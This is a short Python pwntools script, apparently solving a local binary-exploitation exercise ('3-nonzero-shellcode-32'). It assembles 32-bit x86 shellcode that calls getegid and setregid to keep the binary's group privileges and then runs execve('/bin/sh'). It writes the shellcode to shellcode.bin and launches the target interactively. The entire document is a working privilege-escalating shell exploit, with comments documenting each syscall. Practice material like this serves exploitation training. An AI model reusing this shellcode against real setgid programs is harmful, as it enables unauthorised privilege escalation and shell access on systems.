#!/usr/bin/env python3
from pwn import *
from pwn import asm, context, process

context.terminal = ["tmux", "splitw", "-h"]

# setregid(getegid(), getegid())
# setregid: 0x47(%eax) (%ebx = gid_t rgid, %ecx = gid_t rgid)
# getegid: 0x32(%eax)
shellcode = asm(
    """
xor     eax, eax
add     eax, 0x32
int     0x80
mov     ebx, eax
mov     ecx, eax
xor     eax, eax
add     eax, 0x47
int     0x80
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x0b(%eax) (%ebx = const char *filename, %ecx = const char *const *argv, %edx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
xor     eax, eax
add     eax, 0x0b
push    edx
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp
xor     ecx, ecx
xor     edx, edx
int     0x80
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./3-nonzero-shellcode-32"])
io.interactive()
